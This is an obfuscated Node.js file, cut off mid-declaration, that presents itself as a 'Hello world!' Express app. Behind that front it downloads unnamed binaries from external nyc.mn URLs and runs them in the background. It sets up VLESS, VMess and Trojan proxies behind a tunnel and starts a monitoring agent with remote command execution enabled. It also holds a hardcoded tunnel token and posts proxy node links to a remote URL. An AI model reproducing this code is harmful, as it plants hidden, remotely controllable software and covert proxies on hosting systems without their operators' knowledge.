const _0x4a4676=_0x3e04;(function(_0x21959e,_0x4397e6){const _0x4e0ac7={_0x4f3421:0x227,_0xab9e22:0x2a5,_0x22f0b6:0x282,_0x3289e5:0x2a0},_0x143e2d=_0x3e04,_0x29fa8a=_0x21959e();while(!![]){try{const _0x4b9c22=-parseInt(_0x143e2d(_0x4e0ac7._0x4f3421))/0x1*(-parseInt(_0x143e2d(0x2b2))/0x2)+-parseInt(_0x143e2d(0x24c))/0x3+-parseInt(_0x143e2d(0x292))/0x4*(parseInt(_0x143e2d(_0x4e0ac7._0xab9e22))/0x5)+-parseInt(_0x143e2d(_0x4e0ac7._0x22f0b6))/0x6+parseInt(_0x143e2d(0x229))/0x7*(-parseInt(_0x143e2d(0x27e))/0x8)+-parseInt(_0x143e2d(0x1f7))/0x9+parseInt(_0x143e2d(0x242))/0xa*(parseInt(_0x143e2d(_0x4e0ac7._0x3289e5))/0xb);if(_0x4b9c22===_0x4397e6)break;else _0x29fa8a['push'](_0x29fa8a['shift']());}catch(_0x305000){_0x29fa8a['push'](_0x29fa8a['shift']());}}}(_0x3a45,0x6a68f));const express=require(_0x4a4676(0x2b6)),app=express(),axios=require(_0x4a4676(0x2ae)),os=require('os'),fs=require('fs'),path=require(_0x4a4676(0x21a)),{promisify}=require(_0x4a4676(0x248)),exec=promisify(require(_0x4a4676(0x25e))[_0x4a4676(0x225)]),{execSync}=require('child_process'),UPLOAD_URL=process[_0x4a4676(0x24b)][_0x4a4676(0x2a3)]||'',PROJECT_URL=process[_0x4a4676(0x24b)][_0x4a4676(0x1ff)]||'',AUTO_ACCESS=process['env'][_0x4a4676(0x28b)]||![],FILE_PATH=process[_0x4a4676(0x24b)]['FILE_PATH']||_0x4a4676(0x28c),SUB_PATH=process[_0x4a4676(0x24b)][_0x4a4676(0x284)]||_0x4a4676(0x298),PORT=process[_0x4a4676(0x24b)][_0x4a4676(0x2a6)]||process[_0x4a4676(0x24b)][_0x4a4676(0x237)]||0xbb8,UUID=process[_0x4a4676(0x24b)]['UUID']||_0x4a4676(0x202),NEZHA_SERVER=process[_0x4a4676(0x24b)][_0x4a4676(0x239)]||'',NEZHA_PORT=process[_0x4a4676(0x24b)][_0x4a4676(0x21c)]||'',NEZHA_KEY=process[_0x4a4676(0x24b)][_0x4a4676(0x20a)]||'',ARGO_DOMAIN=process[_0x4a4676(0x24b)][_0x4a4676(0x23d)]||_0x4a4676(0x2b0),ARGO_AUTH=process['env'][_0x4a4676(0x2a2)]||_0x4a4676(0x297),ARGO_PORT=process[_0x4a4676(0x24b)][_0x4a4676(0x1fc)]||0x1f41,CFIP=process[_0x4a4676(0x24b)][_0x4a4676(0x25c)]||_0x4a4676(0x28e),CFPORT=process[_0x4a4676(0x24b)][_0x4a4676(0x1f4)]||0x1bb,NAME=process[_0x4a4676(0x24b)][_0x4a4676(0x1f5)]||'railway';!fs['existsSync'](FILE_PATH)?(fs[_0x4a4676(0x204)](FILE_PATH),console[_0x4a4676(0x22e)](FILE_PATH+'\x20is\x20created')):console[_0x4a4676(0x22e)](FILE_PATH+'\x20already\x20exists');function generateRandomName(){const _0xdcf7ce={_0xfe72d8:0x283,_0xdd02f0:0x23a,_0x4715db:0x259},_0x4f593d=_0x4a4676,_0x5413b8=_0x4f593d(0x26c);let _0x2ee424='';for(let _0xb3ce19=0x0;_0xb3ce19<0x6;_0xb3ce19++){_0x2ee424+=_0x5413b8[_0x4f593d(_0xdcf7ce._0xfe72d8)](Math[_0x4f593d(0x2bc)](Math[_0x4f593d(_0xdcf7ce._0xdd02f0)]()*_0x5413b8[_0x4f593d(_0xdcf7ce._0x4715db)]));}return _0x2ee424;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x4a4676(0x22c)](FILE_PATH,npmName),phpPath=path[_0x4a4676(0x22c)](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path['join'](FILE_PATH,botName),subPath=path['join'](FILE_PATH,_0x4a4676(0x201)),listPath=path[_0x4a4676(0x22c)](FILE_PATH,'list.txt'),bootLogPath=path[_0x4a4676(0x22c)](FILE_PATH,_0x4a4676(0x21e)),configPath=path['join'](FILE_PATH,_0x4a4676(0x24f));function deleteNodes(){const _0x3e5eb4={_0x3dea77:0x2ac,_0xf9645f:0x228,_0x4b55c6:0x29f,_0x35572f:0x22f,_0x5867ba:0x29d,_0x31b195:0x280,_0x268407:0x251},_0x4f29ba=_0x4a4676;try{if(!UPLOAD_URL)return;if(!fs[_0x4f29ba(_0x3e5eb4._0x3dea77)](subPath))return;let _0x7908cf;try{_0x7908cf=fs[_0x4f29ba(_0x3e5eb4._0xf9645f)](subPath,_0x4f29ba(0x2ba));}catch{return null;}const _0x104f9a=Buffer[_0x4f29ba(_0x3e5eb4._0x4b55c6)](_0x7908cf,_0x4f29ba(_0x3e5eb4._0x35572f))[_0x4f29ba(0x262)]('utf-8'),_0x42e3ab=_0x104f9a['split']('\x0a')[_0x4f29ba(0x230)](_0x56de04=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x56de04));if(_0x42e3ab[_0x4f29ba(0x259)]===0x0)return;return axios[_0x4f29ba(_0x3e5eb4._0x5867ba)](UPLOAD_URL+_0x4f29ba(0x2aa),JSON['stringify']({'nodes':_0x42e3ab}),{'headers':{'Content-Type':_0x4f29ba(_0x3e5eb4._0x31b195)}})[_0x4f29ba(_0x3e5eb4._0x268407)](_0x46eea6=>{return null;}),null;}catch(_0x1ddbb1){return null;}}function cleanupOldFiles(){const _0x1d5c77={_0x3acff3:0x22c},_0x38bb05=_0x4a4676;try{const _0x133626=fs[_0x38bb05(0x213)](FILE_PATH);_0x133626[_0x38bb05(0x29a)](_0x56fa9d=>{const _0x3c8f1b=_0x38bb05,_0x386b91=path[_0x3c8f1b(_0x1d5c77._0x3acff3)](FILE_PATH,_0x56fa9d);try{const _0x7407f4=fs['statSync'](_0x386b91);_0x7407f4[_0x3c8f1b(0x219)]()&&fs['unlinkSync'](_0x386b91);}catch(_0x17fcac){}});}catch(_0xab0bbe){}}function _0x3e04(_0x5b6653,_0x5a6c3f){const _0x3a45b5=_0x3a45();return _0x3e04=function(_0x3e0402,_0x250b80){_0x3e0402=_0x3e0402-0x1f3;let _0x13b291=_0x3a45b5[_0x3e0402];return _0x13b291;},_0x3e04(_0x5b6653,_0x5a6c3f);}app[_0x4a4676(0x203)]('/',function(_0x39e1a8,_0x5c6000){const _0x3ccb60={_0x433af5:0x295},_0x53c2e0=_0x4a4676;_0x5c6000['send'](_0x53c2e0(_0x3ccb60._0x433af5));});async function generateConfig(){const _0x534208={_0x3e3942:0x29c,_0x2db4d6:0x205,_0x55f700:0x2a1,_0x8db26b:0x223,_0x454b8b:0x216,_0x41cd29:0x23c,_0x1c2af2:0x216,_0x3e5bbb:0x2b4,_0x5326f8:0x24a,_0x4b9920:0x28d,_0x2b4891:0x299,_0x4ccc18:0x268,_0x4ff1c2:0x200},_0x4be331=_0x4a4676,_0x53a3d2={'log':{'access':'/dev/null','error':_0x4be331(0x233),'loglevel':_0x4be331(0x252)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x4be331(_0x534208._0x3e3942),'settings':{'clients':[{'id':UUID,'flow':_0x4be331(_0x534208._0x2db4d6)}],'decryption':_0x4be331(0x252),'fallbacks':[{'dest':0xbb9},{'path':_0x4be331(_0x534208._0x55f700),'dest':0xbba},{'path':_0x4be331(0x232),'dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':_0x4be331(_0x534208._0x8db26b)}},{'port':0xbb9,'listen':'127.0.0.1','protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':_0x4be331(0x252)},'streamSettings':{'network':'tcp','security':_0x4be331(0x252)}},{'port':0xbba,'listen':'127.0.0.1','protocol':_0x4be331(0x29c),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x4be331(0x24a),'tls',_0x4be331(_0x534208._0x454b8b)],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':_0x4be331(0x210),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x4be331(0x24a),_0x4be331(_0x534208._0x41cd29),_0x4be331(_0x534208._0x1c2af2)],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':_0x4be331(0x23b),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x4be331(_0x534208._0x3e5bbb)}},'sniffing':{'enabled':!![],'destOverride':[_0x4be331(_0x534208._0x5326f8),_0x4be331(0x23c),'quic'],'metadataOnly':![]}}],'dns':{'servers':['https+local://8.8.8.8/dns-query']},'outbounds':[{'protocol':_0x4be331(_0x534208._0x4b9920),'tag':_0x4be331(_0x534208._0x2b4891)},{'protocol':_0x4be331(0x220),'tag':_0x4be331(_0x534208._0x4ccc18)}]};fs['writeFileSync'](path[_0x4be331(0x22c)](FILE_PATH,_0x4be331(0x24f)),JSON[_0x4be331(_0x534208._0x4ff1c2)](_0x53a3d2,null,0x2));}function _0x3a45(){const _0xbc9267=['https://amd64.ssss.nyc.mn/v1','true','http://ip-api.com/json/','/config.json\x20>/dev/null\x202>&1\x20&','block','pop','2087','\x20>/dev/null\x202>&1\x20&','abcdefghijklmnopqrstuvwxyz','\x20failed:\x20','\x20is\x20running','error','del\x20/f\x20/q\x20','automatic\x20access\x20task\x20added\x20successfully','Error\x20in\x20startserver:','\x20successfully','rm\x20-rf\x20','push','ARGO_DOMAIN:','https://arm64.ssss.nyc.mn/bot','Skipping\x20adding\x20automatic\x20access\x20task','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','TunnelSecret','aarch64','8443','all','2776fJyjaZ','arm64','application/json','ArgoDomain:','16434zTnyPK','charAt','SUB_PATH','Subscription\x20uploaded\x20successfully','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','https://amd64.ssss.nyc.mn/agent','pkill\x20-f\x20\x22[','stream','\x20>/dev/null\x202>&1','AUTO_ACCESS','./tmp','freedom','cdns.doon.eu.org','split','success','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','92MuoibJ','https://arm64.ssss.nyc.mn/agent','&path=%2Ftrojan-argo%3Fed%3D2560#','Hello\x20world!','country_code','eyJhIjoiZDhhNzU0M2EwZDIyY2YwZTcxODQxODU3MzNlY2NmMmYiLCJ0IjoiNjc3MDczN2ItYzY0ZS00OTFiLTk0NzAtYzVmYTA2OWVmM2Q0IiwicyI6IlpESmtNek0xWVdJdE1qQTFOQzAwTTJNMExUZzBZbVF0WVRrMlpHTmtObU5qWW1ObSJ9','sub','direct','forEach','data','vless','post','false','from','33ffxCAu','/vless-argo','ARGO_AUTH','UPLOAD_URL','firefox','52835QMHiRV','SERVER_PORT','map','Nodes\x20uploaded\x20successfully','arm','/api/delete-nodes','?encryption=none&security=tls&sni=','existsSync','.exe\x20>\x20nul\x202>&1','axios','\x0a\x20\x20tunnel:\x20','railway.xmb.de5.net','\x0a\x20\x20\x20\x20','2216inmitZ','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','/trojan-argo','Error\x20reading\x20boot.log:','express','/sub.txt\x20saved\x20successfully','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','close','utf-8','arch','floor','match','platform','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','countryCode','Error\x20executing\x20command:\x20','CFPORT','NAME','/vmess-argo?ed=2560','2757123pHDKeR','443','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','web\x20running\x20error:\x20','Empowerment\x20success\x20for\x20','ARGO_PORT','/tunnel.yml\x20run','clear','PROJECT_URL','stringify','sub.txt','e7402409-5a3b-751c-e60e-4816e277697a','get','mkdirSync','xtls-rprx-vision','http\x20server\x20is\x20running\x20on\x20port:','Empowerment\x20failed\x20for\x20','\x22\x20>\x20/dev/null\x202>&1','fileName','NEZHA_KEY','\x0a\x0atrojan://','createWriteStream','status','2083','\x0a\x20\x20credentials-file:\x20','vmess','set','https://ipapi.co/json/','readdirSync','amd','Error\x20downloading\x20files:','quic','tunnel.json','NEZHA\x20variable\x20is\x20empty,skip\x20running','isFile','path','?security=tls&sni=','NEZHA_PORT','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','boot.log','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','blackhole','\x0avless://','unlinkSync','tcp','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','exec','\x20-c\x20\x22','387PrGkYw','readFileSync','11921rSzoyW','Download\x20','config.yaml','join','2096','log','base64','filter','Unhandled\x20error\x20in\x20startserver:','/vmess-argo','/dev/null','test','response','\x20-s\x20','PORT','https://arm64.ssss.nyc.mn/web','NEZHA_SERVER','random','trojan','tls','ARGO_DOMAIN','https://amd64.ssss.nyc.mn/bot','App\x20is\x20running','message','org','5983010xpwuSR','Add\x20automatic\x20access\x20task\x20faild:\x20','\x0a\x0avmess://','https://arm64.ssss.nyc.mn/v1','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','--tls','util','fileUrl','http','env','1934328jjXNIb','includes','basename','config.json','2053','catch','none','Unknown','nohup\x20','Content-Type','php\x20running\x20error:\x20','writeFileSync','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','length','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','win32','CFIP','\x20-p\x20','child_process','send','unshift','&fp=firefox&type=ws&host=','toString','\x0aclient_secret:\x20'];_0x3a45=function(){return _0xbc9267;};return _0x3a45();}function getSystemArchitecture(){const _0x5304e3={_0x465dbe:0x2bb,_0x12aef7:0x27f,_0x30791a:0x27b},_0x4ef1a2=_0x4a4676,_0x3258a0=os[_0x4ef1a2(_0x5304e3._0x465dbe)]();return _0x3258a0===_0x4ef1a2(0x2a9)||_0x3258a0===_0x4ef1a2(_0x5304e3._0x12aef7)||_0x3258a0===_0x4ef1a2(_0x5304e3._0x30791a)?_0x4ef1a2(0x2a9):_0x4ef1a2(0x214);}function downloadFile(_0x452afe,_0x550d31,_0x416d2c){const _0x25f56a={_0x1a4286:0x204},_0x4a9152={_0x4822e6:0x26d},_0x4c74a7={_0x12ede8:0x29b},_0x44f436={_0x40c92d:0x22a,_0x4876ef:0x26d,_0x293ef2:0x26f},_0x372955=_0x4a4676,_0x3dd3f9=_0x452afe;!fs[_0x372955(0x2ac)](FILE_PATH)&&fs[_0x372955(_0x25f56a._0x1a4286)](FILE_PATH,{'recursive':!![]});const _0x86a8af=fs[_0x372955(0x20c)](_0x3dd3f9);axios({'method':'get','url':_0x550d31,'responseType':_0x372955(0x289)})['then'](_0x6b4ef8=>{const _0x4d2ace={_0x22ad1d:0x2b9,_0x4fab4f:0x22e},_0x456cce=_0x372955;_0x6b4ef8[_0x456cce(_0x4c74a7._0x12ede8)]['pipe'](_0x86a8af),_0x86a8af['on']('finish',()=>{const _0x15040d=_0x456cce;_0x86a8af[_0x15040d(_0x4d2ace._0x22ad1d)](),console[_0x15040d(_0x4d2ace._0x4fab4f)](_0x15040d(0x22a)+path[_0x15040d(0x24e)](_0x3dd3f9)+_0x15040d(0x273)),_0x416d2c(null,_0x3dd3f9);}),_0x86a8af['on'](_0x456cce(0x26f),_0x472ead=>{const _0x1ea33e=_0x456cce;fs['unlink'](_0x3dd3f9,()=>{});const _0x199e6d=_0x1ea33e(_0x44f436._0x40c92d)+path[_0x1ea33e(0x24e)](_0x3dd3f9)+_0x1ea33e(_0x44f436._0x4876ef)+_0x472ead[_0x1ea33e(0x240)];console[_0x1ea33e(_0x44f436._0x293ef2)](_0x199e6d),_0x416d2c(_0x199e6d);});})['catch'](_0x5a2d59=>{const _0x5e0efe=_0x372955,_0x2d4e3a=_0x5e0efe(0x22a)+path[_0x5e0efe(0x24e)](_0x3dd3f9)+_0x5e0efe(_0x4a9152._0x4822e6)+_0x5a2d59[_0x5e0efe(0x240)];console['error'](_0x2d4e3a),_0x416d2c(_0x2d4e3a);});}async function downloadFilesAndRun(){const _0x1f21c6={_0x3f70c9:0x22e,_0x201b6c:0x1f9,_0x35c65c:0x2a7,_0x327ff0:0x27d,_0x4cce0d:0x215,_0x566262:0x24d,_0x35099d:0x269,_0x3eb1a8:0x258,_0x1bb48b:0x257,_0x3e1982:0x22c,_0xe1a7bb:0x22b,_0x2b2387:0x254,_0x1dfc84:0x26e,_0x51baca:0x26f,_0x32adab:0x256,_0x523c3d:0x22d,_0x5164e6:0x20e,_0x26b964:0x250,_0x5f2f45:0x247,_0x185b69:0x236,_0x26bae7:0x25d,_0x2063d6:0x1fa,_0x14abd8:0x2ac,_0x9482a8:0x1fd,_0x3bc143:0x26b},_0x148ec3={_0x5599c5:0x29a},_0x4dc51b=_0x4a4676,_0x557e4a=getSystemArchitecture(),_0x11e97c=getFilesForArchitecture(_0x557e4a);if(_0x11e97c[_0x4dc51b(0x259)]===0x0){console[_0x4dc51b(_0x1f21c6._0x3f70c9)](_0x4dc51b(_0x1f21c6._0x201b6c));return;}const _0x3bf6f2=_0x11e97c[_0x4dc51b(_0x1f21c6._0x35c65c)](_0x2f3e92=>{return new Promise((_0x130509,_0x2d0e8f)=>{const _0x2c734b=_0x3e04;downloadFile(_0x2f3e92[_0x2c734b(0x209)],_0x2f3e92[_0x2c734b(0x249)],(_0x3a14bb,_0xac22b1)=>{_0x3a14bb?_0x2d0e8f(_0x3a14bb):_0x130509(_0xac22b1);});});});try{await Promise[_0x4dc51b(_0x1f21c6._0x327ff0)](_0x3bf6f2);}catch(_0x2a436f){console['error'](_0x4dc51b(_0x1f21c6._0x4cce0d),_0x2a436f);return;}function _0x34e37c(_0x101059){const _0x355b8c={_0x3569d9:0x1fb,_0x52d354:0x262},_0xe69503=_0x4dc51b,_0x28b77e=0x1fd;_0x101059[_0xe69503(_0x148ec3._0x5599c5)](_0x28c326=>{fs['existsSync'](_0x28c326)&&fs['chmod'](_0x28c326,_0x28b77e,_0x17ceba=>{const _0x1e4977=_0x3e04;_0x17ceba?console[_0x1e4977(0x26f)](_0x1e4977(0x207)+_0x28c326+':\x20'+_0x17ceba):console['log'](_0x1e4977(_0x355b8c._0x3569d9)+_0x28c326+':\x20'+_0x28b77e[_0x1e4977(_0x355b8c._0x52d354)](0x8));});});}const _0x5c742a=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x34e37c(_0x5c742a);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x24142a=NEZHA_SERVER[_0x4dc51b(_0x1f21c6._0x566262)](':')?NEZHA_SERVER[_0x4dc51b(0x28f)](':')[_0x4dc51b(_0x1f21c6._0x35099d)]():'',_0x4037f1=new Set(['443',_0x4dc51b(0x27c),_0x4dc51b(0x22d),'2087',_0x4dc51b(0x20e),'2053']),_0x36cb05=_0x4037f1['has'](_0x24142a)?_0x4dc51b(0x265):_0x4dc51b(0x29e),_0x2a5674=_0x4dc51b(0x263)+NEZHA_KEY+_0x4dc51b(0x21d)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x36cb05+_0x4dc51b(_0x1f21c6._0x3eb1a8)+UUID;fs[_0x4dc51b(_0x1f21c6._0x1bb48b)](path[_0x4dc51b(_0x1f21c6._0x3e1982)](FILE_PATH,_0x4dc51b(_0x1f21c6._0xe1a7bb)),_0x2a5674);const _0x3bf52b=_0x4dc51b(_0x1f21c6._0x2b2387)+phpPath+_0x4dc51b(0x226)+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x3bf52b),console[_0x4dc51b(0x22e)](phpName+_0x4dc51b(_0x1f21c6._0x1dfc84)),await new Promise(_0x573e94=>setTimeout(_0x573e94,0x3e8));}catch(_0x3c64f7){console[_0x4dc51b(_0x1f21c6._0x51baca)](_0x4dc51b(_0x1f21c6._0x32adab)+_0x3c64f7);}}else{let _0x7944fb='';const _0x15aa13=[_0x4dc51b(0x1f8),_0x4dc51b(0x27c),_0x4dc51b(_0x1f21c6._0x523c3d),_0x4dc51b(0x26a),_0x4dc51b(_0x1f21c6._0x5164e6),_0x4dc51b(_0x1f21c6._0x26b964)];_0x15aa13[_0x4dc51b(_0x1f21c6._0x566262)](NEZHA_PORT)&&(_0x7944fb=_0x4dc51b(_0x1f21c6._0x5f2f45));const _0x411f2f=_0x4dc51b(0x254)+npmPath+_0x4dc51b(_0x1f21c6._0x185b69)+NEZHA_SERVER+':'+NEZHA_PORT+_0x4dc51b(_0x1f21c6._0x26bae7)+NEZHA_KEY+'\x20'+_0x7944fb+_0x4dc51b(0x21f);try{await exec(_0x411f2f),console[_0x4dc51b(0x22e)](npmName+'\x20is\x20running'),await new Promise(_0x62d755=>setTimeout(_0x62d755,0x3e8));}catch(_0x86063d){console[_0x4dc51b(_0x1f21c6._0x51baca)]('npm\x20running\x20error:\x20'+_0x86063d);}}}else console[_0x4dc51b(0x22e)](_0x4dc51b(0x218));const _0x355faf=_0x4dc51b(_0x1f21c6._0x2b2387)+webPath+'\x20-c\x20'+FILE_PATH+_0x4dc51b(0x267);try{await exec(_0x355faf),console[_0x4dc51b(0x22e)](webName+_0x4dc51b(0x26e)),await new Promise(_0x18f1b4=>setTimeout(_0x18f1b4,0x3e8));}catch(_0x14654c){console['error'](_0x4dc51b(_0x1f21c6._0x2063d6)+_0x14654c);}if(fs[_0x4dc51b(_0x1f21c6._0x14abd8)](botPath)){let _0x4eed90;if(ARGO_AUTH[_0x4dc51b(0x2bd)](/^[A-Z0-9a-z=]{120,250}$/))_0x4eed90=_0x4dc51b(0x2bf)+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0x4eed90=_0x4dc51b(0x291)+FILE_PATH+_0x4dc51b(_0x1f21c6._0x9482a8):_0x4eed90='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x4dc51b(0x246)+ARGO_PORT;try{await exec(_0x4dc51b(0x254)+botPath+'\x20'+_0x4eed90+_0x4dc51b(_0x1f21c6._0x3bc143)),console[_0x4dc51b(_0x1f21c6._0x3f70c9)](botName+_0x4dc51b(0x26e)),await new Promise(_0x482990=>setTimeout(_0x482990,0x7d0));}catch(_0x1f1006){console['error']('Error\x20executing\x20command:\x20'+_0x1f1006);}}await new Promise(_0xe938ed=>setTimeout(_0xe938ed,0x1388));}function getFilesForArchitecture(_0x1be761){const _0x14ef02={_0x4c1b0c:0x264,_0xe3ad21:0x260},_0x4de0a0=_0x4a4676;let _0x922a51;_0x1be761==='arm'?_0x922a51=[{'fileName':webPath,'fileUrl':_0x4de0a0(0x238)},{'fileName':botPath,'fileUrl':_0x4de0a0(0x277)}]:_0x922a51=[{'fileName':webPath,'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x4de0a0(0x23e)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x377e2b=_0x1be761==='arm'?_0x4de0a0(0x293):_0x4de0a0(0x287);_0x922a51[_0x4de0a0(0x260)]({'fileName':npmPath,'fileUrl':_0x377e2b});}else{const _0x20a885=_0x1be761===_0x4de0a0(0x2a9)?_0x4de0a0(0x245):_0x4de0a0(_0x14ef02._0x4c1b0c);_0x922a51[_0x4de0a0(_0x14ef02._0xe3ad21)]({'fileName':phpPath,'fileUrl':_0x20a885});}}return _0x922a51;}function argoType(){const _0x564d58={_0x14e380:0x24d,_0x19440b:0x257,_0x3d44ef:0x217,_0x50a999:0x2b8,_0x9d7cc9:0x22c},_0x43c029=_0x4a4676;if(!ARGO_AUTH||!ARGO_DOMAIN){console['log']('ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(ARGO_AUTH[_0x43c029(_0x564d58._0x14e380)](_0x43c029(0x27a))){fs[_0x43c029(_0x564d58._0x19440b)](path[_0x43c029(0x22c)](FILE_PATH,_0x43c029(_0x564d58._0x3d44ef)),ARGO_AUTH);const _0x266323=_0x43c029(0x2af)+ARGO_AUTH[_0x43c029(0x28f)]('\x22')[0xb]+_0x43c029(0x20f)+path['join'](FILE_PATH,_0x43c029(_0x564d58._0x3d44ef))+_0x43c029(0x286)+ARGO_DOMAIN+_0x43c029(_0x564d58._0x50a999)+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs[_0x43c029(0x257)](path[_0x43c029(_0x564d58._0x9d7cc9)](FILE_PATH,'tunnel.yml'),_0x266323);}else console['log'](_0x43c029(0x2b3));}async function extractDomains(){const _0x1dace8={_0x427d6b:0x228,_0xa844b0:0x22c,_0x52c8ca:0x2ba,_0x7126b8:0x28f,_0x3b17fa:0x29a,_0x2005be:0x224,_0x5cfa0e:0x222,_0x2638e6:0x22c,_0x116f69:0x21e,_0x519c45:0x279,_0x5eaf61:0x26e},_0x12e770={_0x4269d3:0x29b,_0x16edfd:0x29b,_0x12dfa1:0x29b,_0x7858ca:0x241,_0xd1aefe:0x266,_0x58e052:0x241,_0x49632b:0x2c0,_0xd56149:0x253},_0xa026a2={_0x3280c1:0x2ad,_0x203973:0x288},_0x4c7bea={_0x3b9253:0x275},_0x356b63=_0x4a4676;let _0x144010;if(ARGO_AUTH&&ARGO_DOMAIN)_0x144010=ARGO_DOMAIN,console['log'](_0x356b63(0x276),_0x144010),await _0x2ceda6(_0x144010);else try{const _0x2a48e0=fs[_0x356b63(_0x1dace8._0x427d6b)](path[_0x356b63(_0x1dace8._0xa844b0)](FILE_PATH,_0x356b63(0x21e)),_0x356b63(_0x1dace8._0x52c8ca)),_0x2ed277=_0x2a48e0[_0x356b63(_0x1dace8._0x7126b8)]('\x0a'),_0x2385da=[];_0x2ed277[_0x356b63(_0x1dace8._0x3b17fa)](_0x69ac31=>{const _0x518f85=_0x356b63,_0x2ebaa0=_0x69ac31[_0x518f85(0x2bd)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x2ebaa0){const _0x343bc6=_0x2ebaa0[0x1];_0x2385da[_0x518f85(_0x4c7bea._0x3b9253)](_0x343bc6);}});if(_0x2385da[_0x356b63(0x259)]>0x0)_0x144010=_0x2385da[0x0],console['log'](_0x356b63(0x281),_0x144010),await _0x2ceda6(_0x144010);else{console['log'](_0x356b63(_0x1dace8._0x2005be)),fs[_0x356b63(_0x1dace8._0x5cfa0e)](path[_0x356b63(_0x1dace8._0x2638e6)](FILE_PATH,_0x356b63(_0x1dace8._0x116f69)));async function _0x25ed31(){const _0x51b196=_0x356b63;try{process['platform']===_0x51b196(0x25b)?await exec('taskkill\x20/f\x20/im\x20'+botName+_0x51b196(_0xa026a2._0x3280c1)):await exec(_0x51b196(_0xa026a2._0x203973)+botName['charAt'](0x0)+']'+botName['substring'](0x1)+_0x51b196(0x208));}catch(_0x5bace8){}}_0x25ed31(),await new Promise(_0x55c5c4=>setTimeout(_0x55c5c4,0xbb8));const _0x496ba8=_0x356b63(_0x1dace8._0x519c45)+FILE_PATH+_0x356b63(0x246)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x496ba8+_0x356b63(0x26b)),console['log'](botName+_0x356b63(_0x1dace8._0x5eaf61)),await new Promise(_0x2f1d2a=>setTimeout(_0x2f1d2a,0xbb8)),await extractDomains();}catch(_0x59f1b4){console[_0x356b63(0x26f)](_0x356b63(0x1f3)+_0x59f1b4);}}}catch(_0x17b220){console['error'](_0x356b63(0x2b5),_0x17b220);}async function _0x16af05(){const _0x8d78a5=_0x356b63;try{const _0x12257b=await axios[_0x8d78a5(0x203)](_0x8d78a5(0x212),{'timeout':0xbb8});if(_0x12257b[_0x8d78a5(0x29b)]&&_0x12257b[_0x8d78a5(_0x12e770._0x4269d3)][_0x8d78a5(0x296)]&&_0x12257b['data'][_0x8d78a5(0x241)])return _0x12257b[_0x8d78a5(_0x12e770._0x16edfd)][_0x8d78a5(0x296)]+'_'+_0x12257b[_0x8d78a5(_0x12e770._0x12dfa1)][_0x8d78a5(_0x12e770._0x7858ca)];}catch(_0x3e0c06){try{const _0x1bcea8=await axios[_0x8d78a5(0x203)](_0x8d78a5(_0x12e770._0xd1aefe),{'timeout':0xbb8});if(_0x1bcea8[_0x8d78a5(0x29b)]&&_0x1bcea8[_0x8d78a5(0x29b)]['status']===_0x8d78a5(0x290)&&_0x1bcea8['data']['countryCode']&&_0x1bcea8['data'][_0x8d78a5(_0x12e770._0x58e052)])return _0x1bcea8['data'][_0x8d78a5(_0x12e770._0x49632b)]+'_'+_0x1bcea8[_0x8d78a5(0x29b)][_0x8d78a5(0x241)];}catch(_0x5bb8b8){}}return _0x8d78a5(_0x12e770._0xd56149);}async function 